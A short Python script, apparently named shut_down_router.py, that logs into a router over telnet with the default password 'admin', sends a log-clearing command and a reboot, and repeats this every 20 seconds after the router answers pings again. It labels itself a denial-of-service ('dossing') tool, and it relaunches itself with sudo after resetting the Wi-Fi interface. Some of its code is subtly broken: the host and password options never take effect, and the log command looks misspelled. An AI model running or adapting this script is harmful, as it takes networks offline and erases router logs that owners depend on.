from __future__ import print_function

import os
import time
import telnetlib
import argparse

# -------------- #
HOST = "192.168.1.1"
PASSWORD = "admin"
# -------------- #

GLOBAL_ERROR_COUNT = 0


def main():

	parser = argparse.ArgumentParser()
	parser.add_argument("-H", '--host', type=str, help='Sets host', default=False)
	parser.add_argument("-P", "--password", type=str, help='password', default=False)

	args = parser.parse_args()

	if args.host:
		HOST = args.host

	if args.password:
		PASSWORD = args.password

	while True:
		DOS()
		check()
		time.sleep(20)


def clear():
		os.system("ifconfig wlan0 down")
		time.sleep(1)
		os.system("ifconfig wlan0 up")
		time.sleep(15)
		os.system("sudo python ./shut_down_router.py &")

def DOS():
	print("dossing")
	password = (PASSWORD.encode())

	try:
		tn = telnetlib.Telnet(HOST)
	except Exception as e:
		global GLOBAL_ERROR_COUNT
		GLOBAL_ERROR_COUNT += 1
		if GLOBAL_ERROR_COUNT > 2:
			clear()
			GLOBAL_ERROR_COUNT = 0
		time.sleep(30)
		main()

	if password:
		tn.read_until("Password: ".encode())
		tn.write(password + "\n".encode())

	tn.write("sys log cleart\n".encode())
	tn.write("sys reboot\n".encode())
	tn.close()
	print("dos is complete")



def check():
	while True:
		response = os.system("ping -c 1 " + HOST)
		print(response)
		if response == 0:
			return True
		else:
			time.sleep(1)


if __name__ == "__main__":
	main()

